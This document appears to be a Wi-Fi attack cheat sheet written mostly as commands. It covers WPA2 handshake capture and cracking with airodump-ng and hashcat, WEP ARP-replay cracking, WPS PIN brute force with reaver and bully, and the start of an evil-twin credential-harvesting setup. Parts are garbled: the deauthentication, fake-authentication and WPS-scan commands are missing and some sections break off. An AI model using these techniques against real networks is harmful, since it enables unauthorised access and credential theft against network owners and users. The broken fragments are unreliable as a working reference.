═══════════════════════════════════════

📡 UNDERSTANDING THE HANDSHAKE

**4-Way Handshake Process:**
1. AP sends ANonce to client
2. Client sends SNonce + MIC to AP
3. AP sends GTK + MIC to client
4. Client sends ACK to AP

**What we need:** EAPOL frames from steps 1-4

═══════════════════════════════════════

🔧 STEP 1: PREPARE WIRELESS ADAPTER

**Check adapter:**
```bash
# List wireless interfaces
iwconfig

# Check if monitor mode supported
iw list | grep monitor

# Kill conflicting processes
sudo airmon-ng check kill
```

**Enable monitor mode:**
```bash
# Method 1: Using airmon-ng
sudo airmon-ng start wlan0

# Method 2: Using iw/ip
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0
```

═══════════════════════════════════════

🔍 STEP 2: DISCOVER TARGET NETWORK

**Scan for networks:**
```bash
# Start airodump-ng to find targets
sudo airodump-ng wlan0mon

# Output shows:
# BSSID, PWR, Beacons, Data, CH, MB, ENC, CIPHER, AUTH, ESSID
```

**Example output:**
```
BSSID              PWR  CH  ENC  CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -42   6  WPA2 CCMP   PSK   TargetNetwork
```

**Note the following:**
• BSSID: AA:BB:CC:DD:EE:FF
• Channel: 6
• ESSID: TargetNetwork

🔧 STEP 3: CAPTURE HANDSHAKE

**Focus on target network:**
```bash
# Capture on specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# -c 6         : Channel 6
# --bssid      : Target AP MAC
# -w capture   : Output filename prefix
```

**Wait for client to connect, OR force reconnection...**

💥 STEP 4: DEAUTHENTICATION ATTACK

**Open new terminal, deauth clients:**
```bash

# -a       : Access Point MAC
```

**Watch airodump-ng window for:**
```

```

```bash

# Crack with hashcat (mode 22000 for WPA2)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack (8 digit password)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Combinator attack
hashcat -m 22000 hash.hc22000 -a 1 wordlist1.txt wordlist2.txt
```

✅ Try deauthing multiple times

✅ Target multiple clients
✅ Wait for natural reconnection

**Problem: Handshake but won't crack**
✅ Password not in wordlist
✅ Try different wordlists
✅ Use rules/masks
✅ Check if WPS enabled instead

**Problem: Monitor mode not working**
✅ Kill NetworkManager: `airmon-ng check kill`
✅ Use compatible adapter (Atheros, Ralink, Realtek RTL8812AU)
✅ Check kernel drivers
✅ Try external USB adapter

**Problem: Deauth not working**
✅ Check if packet injection works: `aireplay-ng -9 wlan0mon`
✅ Increase TX power: `iwconfig wlan0mon txpower 30`
✅ Try different channel
✅ AP may have deauth protection

## ESSENTIAL ATTACK TECHNIQUES

### WEP Cracking (Fast Method)
```bash
# Step 1: Start monitoring
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon

# Step 2: Fake authentication

# Step 3: ARP replay attack (generate IVs)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Wait for ~20,000 IVs

# Step 4: Crack WEP key
aircrack-ng wep-01.cap

# 64-bit WEP: ~20,000 IVs needed
# 128-bit WEP: ~40,000 IVs needed
```

### WPS PIN Brute Force (Reaver)
```bash
# Scan for WPS-enabled APs

# Attack WPS

# With delay to avoid lockout
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5 -c 6

# Pixie Dust attack (faster, if vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K -c 6

# Using bully (alternative tool)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3
```

### Evil Twin Attack (Credential Harvesting)
```bash

cat > /tmp/dhcpd.conf << EOF
authoritative;

max-lease-time 7200;

    option routers 10.0.0.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 10.0.0.1;
    range 10.0.0.10 10.0.0.100;

# Start DHCP server
sudo dhcpd -cf /tmp/dhcpd.conf at0
```
